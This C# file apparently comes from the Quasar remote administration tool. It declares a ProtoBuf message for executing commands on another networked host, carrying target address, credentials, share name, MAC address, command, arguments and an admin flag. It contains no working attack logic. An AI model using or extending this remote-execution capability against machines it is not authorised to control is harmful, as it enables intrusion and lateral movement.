using ProtoBuf;
using System.Net;
using Quasar.Common.Messages.other;

namespace Quasar.Common.Messages.Network
{
    [ProtoContract]
    public class DoRemoteCommandExecute : IMessage
    {
        [ProtoMember(1)]
        public IPAddress Address { get; set; }

        [ProtoMember(2)]
        public int Port { get; set; }

        [ProtoMember(3)]
        public string Username { get; set; }

        [ProtoMember(4)]
        public string Password { get; set; }

        [ProtoMember(5)]
        public string Share { get; set; }

        [ProtoMember(6)]
        public string MAC { get; set; }

        [ProtoMember(7)]
        public string Command { get; set; }

        [ProtoMember(8)]
        public string[] Args { get; set; }

        [ProtoMember(9)]
        public bool AsAdmin { get; set; }
    }
}
